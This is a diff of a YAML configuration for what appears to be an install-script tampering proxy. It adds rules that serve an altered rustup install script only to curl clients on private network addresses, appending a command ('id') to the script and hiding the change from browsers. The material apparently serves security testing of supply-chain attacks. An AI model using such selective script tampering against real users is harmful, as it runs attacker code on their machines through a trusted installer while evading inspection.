@@ -15,12 +15,42 @@ check:
   cmds:
   - "curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs:${SH4D0WUP_BOUND_PORT} | sh -s -- -y"
 
+selectors:
+  target:
+    type: all
+    selectors:
+      # only infect local computers
+      - type: not
+        selector: internet
+      # only show the patched version to curl, no browsers
+      - type: header
+        key: user-agent
+        regex: curl
+
+  internet:
+    type: all
+    selectors:
+      - type: not
+        selector:
+          type: ipaddr
+          ipaddr: 10.0.0.0/8
+      - type: not
+        selector:
+          type: ipaddr
+          ipaddr: 192.168.0.0/16
+      - type: not
+        selector:
+          type: ipaddr
+          ipaddr: 127.0.0.0/8
+
 routes:
   - path: /
     type: append
+    selector: target
     args:
       upstream: rustup
-      data: 'id'
+      data: |
+        id
   - type: proxy
     args:
       upstream: rustup
